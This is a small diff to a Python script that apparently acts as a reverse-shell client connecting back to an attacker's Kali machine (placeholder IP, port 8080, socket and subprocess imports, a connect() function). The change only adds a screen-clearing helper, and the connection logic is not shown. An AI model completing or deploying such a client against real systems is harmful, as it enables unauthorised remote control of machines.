@@ -2,10 +2,19 @@
 
 import socket
 import subprocess
+import os
 
 ip_addr = "Your Kali IP"         # use your kali IP address
 port = 8080                      # use any port
 
+def clear():    
+
+    name = os.name
+
+    if name == "nt":
+        os.system("cls")
+    else:
+        os.system("clear")
 
 def connect():
 
